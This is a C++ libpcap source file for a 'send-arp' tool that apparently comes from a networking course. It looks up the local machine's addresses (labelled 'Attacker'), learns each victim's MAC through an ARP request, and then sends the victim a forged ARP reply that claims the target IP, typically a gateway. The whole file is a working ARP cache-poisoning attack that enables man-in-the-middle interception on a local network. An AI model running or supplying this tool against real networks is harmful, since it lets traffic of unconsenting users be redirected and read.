#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

typedef struct s_info {
	Mac	mac;
	Ip	ip;
}	t_info;

int	getAttackerInfo(t_info *attacker, char *dev)
{
	struct ifreq ifr;
   	int fd;
	
	fd = socket(PF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    if (!ioctl(fd, SIOCGIFHWADDR, &ifr))
		attacker->mac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
	else
		return 1;
	if (!ioctl(fd, SIOCGIFADDR, &ifr))
		attacker->ip = Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
	else
		return 1;
	printf("Attacker's mac addr: [%s]\n", std::string(attacker->mac).data());
	printf("Attacker's ip addr: [%s]\n", std::string(attacker->ip).data());
	close(fd);
	return 0;
}


int	SendARPPacket(pcap *handle, Mac eth_smac, Mac eth_dmac, t_info arp_sender, t_info arp_target, int mode)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	else
		packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = arp_sender.mac;
	packet.arp_.sip_ = htonl(arp_sender.ip);
	packet.arp_.tmac_ = arp_target.mac;
	packet.arp_.tip_ = htonl(arp_target.ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res) {
		fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 1;
	}
	return 0;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	t_info Attacker, Sender, Target;
	getAttackerInfo(&Attacker, dev);

	for(int i=1; i<argc/2; i++){
		Sender.ip = Ip(std::string(argv[2*i]));
		Target.ip = Ip(std::string(argv[2*i+1]));

		SendARPPacket(handle, Attacker.mac, Mac::broadcastMac(), Attacker, Sender, 0);

		while (1){
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				fprintf(stderr, "Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				return 1;
			}
			/*Check packet is ARP*/
			if (((EthHdr *)packet)->type() != ((EthHdr *)packet)->Arp)
				break;
			
			/*Check packet is reply for my packet*/
			EthArpPacket *resPacket = (EthArpPacket *)packet;
			if (resPacket->arp_.sip() == Sender.ip && resPacket->arp_.tip() == Attacker.ip){
				Sender.mac = resPacket->eth_.smac();	
				printf("Sender's mac addr: [%s]\n", std::string(Sender.mac).data());
				break;
			}
		}

		Attacker.ip = Target.ip;
		if (!SendARPPacket(handle, Attacker.mac, Sender.mac, Attacker, Sender, 1)){
			printf("Success");
		}
	}

	pcap_close(handle);

}
